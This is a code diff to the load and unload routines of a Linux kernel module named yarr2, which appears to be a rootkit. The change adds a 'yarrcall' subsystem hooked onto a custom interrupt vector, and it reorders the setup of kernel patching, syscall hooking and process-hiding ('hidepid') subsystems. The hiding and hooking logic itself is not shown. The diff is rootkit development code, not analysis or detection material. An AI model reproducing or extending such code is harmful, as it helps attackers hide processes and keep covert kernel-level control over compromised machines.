@@ -6,6 +6,7 @@
 #include "hook.h"
 #include "patch.h"
 #include "hidepid.h"
+#include "yarrcall.h"
 
 #ifdef DEBUG
 MODULE_LICENSE("GPL");
@@ -21,17 +22,47 @@ static int __init yarr2_init(void) {
 
     yarr_log("Loading yarr2 into kernel...");
 
-    yarr_log("Initializing hidepid subsystem...");
-    err = init_hidepid();
+    yarr_log("Initializing patch subsystem...");
+    err = patch_init();
     if (err) {
-        yarr_log("Errors!");
+        yarr_log("Errors initializing patch subsystem");
         return -1;
     }
 
-    yarr_log("Initializing syscall tables hooking subsystem...");
-    err = hook_syscall_tables();
+    // For now this subsystem has to be initialized here as other subsystems
+    // depends on it.
+    yarr_log("Initializing hook subsystem...");
+    err = hook_init();
     if (err) {
-        yarr_log("Errors!");
+        yarr_log("Errors initializing hook subsystem");
+        return -1;
+    }
+
+    yarr_log("Initializing hidepid subsystem...");
+    err = hidepid_init();
+    if (err) {
+        yarr_log("Errors initializing hidepid subsystem");
+        return -1;
+    }
+
+    yarr_log("Initializing yarrcall subsystem...");
+    err = yarrcall_init();
+    if (err) {
+        yarr_log("Errors initializing yarrcall subsystem");
+        return -1;
+    }
+
+    yarr_log("Installing hidepid hooks...");
+    err = hidepid_install_hooks();
+    if (err) {
+        yarr_log("Errors installing hidepid hooks");
+        return -1;
+    }
+
+    yarr_log("Installing yarrcall hook...");
+    err = install_hook(YARR_VECTOR, entry_yarrcall);
+    if (err) {
+        yarr_log("Errors installing yarrcall entry point");
         return -1;
     }
 
@@ -46,10 +77,24 @@ static void __exit yarr2_exit(void) {
     // should try to clean the remaining running subsystems.
     yarr_log("Starting unload of yarr2...");
 
+    yarr_log("Stopping yarrcall subsystem...");
+    err = yarrcall_finish();
+    if (err) {
+        yarr_log("Errors stopping yarrcall subsystem");
+        return;
+    }
+
     yarr_log("Stopping hidepid subsystem...");
-    err = stop_hidepid();
+    err = hidepid_finish();
     if (err) {
         yarr_log("Errors stopping hidepid subsystem");
+        return;
+    }
+
+    yarr_log("Stopping hook subsystem...");
+    err = hook_finish();
+    if (err) {
+        yarr_log("Errors stopping hook subsystem");
         return;
     }
 
@@ -62,7 +107,7 @@ static void __exit yarr2_exit(void) {
     // hooks it) and unloading yarr2 through rmmod from a shell without
     // launching in the background (without using '&').
     yarr_log("Stopping patch subsystem...");
-    err = stop_patch();
+    err = patch_finish();
     if (err) {
         yarr_log("Errors stopping patch subsystem");
         return;
